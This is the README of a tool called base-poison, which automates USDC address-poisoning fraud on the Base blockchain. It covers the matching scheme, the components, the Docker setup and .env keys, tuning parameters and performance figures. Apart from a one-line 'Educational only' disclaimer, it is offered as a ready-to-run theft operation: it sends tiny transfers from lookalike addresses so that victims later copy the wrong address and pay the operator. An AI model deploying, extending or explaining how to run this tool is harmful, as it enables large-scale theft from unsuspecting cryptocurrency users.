# base-poison

[中文](./README.md)

USDC address poisoning on Base L2

## How it works

Someone transfers USDC → we find a lookalike address → send them a tiny tx → they might copy the wrong one later

Steps:
1. Subscribe to Transfer events via WebSocket
2. Match sender's first 4 + last 4 chars against our 15B address pool
3. Hit? Send 0.0001 USDC from the lookalike
4. Done

## Components

```
generator/   Rust, cranks out ~200k addrs/hour
core/        Go, monitors + matches, 15B addrs in memory
executor/    Batches txs together, saves gas
base.sol     Contract for batch transfers
```

## Setup

Need Docker, 64G+ RAM

```bash
git clone https://github.com/yourname/base-poison.git
cd base-poison
cp .env.example .env
vim .env
```

Fill in `.env`:

```bash
POSTGRES_PASSWORD=xxx
GENERATOR_MASTER_KEY=xxx  # openssl rand -hex 32

RPC_URLS=https://mainnet.base.org
WS_URLS=wss://base.publicnode.com

POISONER_CONTRACT=0x...   # your deployed contract
OWNER_PRIVATE_KEY=0x...

WEB_SECRET_PATH=xxx
WEB_PASSWORD=xxx
```

Deploy contract: edit OWNER in `base.sol`, deploy, fund with ETH + USDC

Run:

```bash
docker compose -f docker-compose.prod.yml up -d
docker logs -f poison_core

# addr generation (runs for days)
docker compose -f docker-compose.prod.yml run generator
```

Dashboard: `http://ip:8083/your_path`

## Config

| Param | What | Default |
|-------|------|---------|
| `BATCH_SIZE_MIN/MAX` | How many to batch | 100-300 |
| `USDC_AMOUNT` | Amount per poison | 0.0001 |
| `ETH_AMOUNT` | Gas money per addr | 0.0000005 |
| `MIN_TRANSFER_AMOUNT_USD` | Min $ to trigger | 30 |
| `USE_MEMORY_INDEX` | Keep addrs in RAM | true |

## Benchmarks

80-core 128G box:
- Generation: 200k/h
- Matching: <100μs
- Memory: 80G for 15B addrs
- Latency: <2s end-to-end

## Security

- Keys are AES-256-GCM encrypted
- Use nginx + https in prod
- Don't expose postgres

Educational only. You're on your own.

MIT

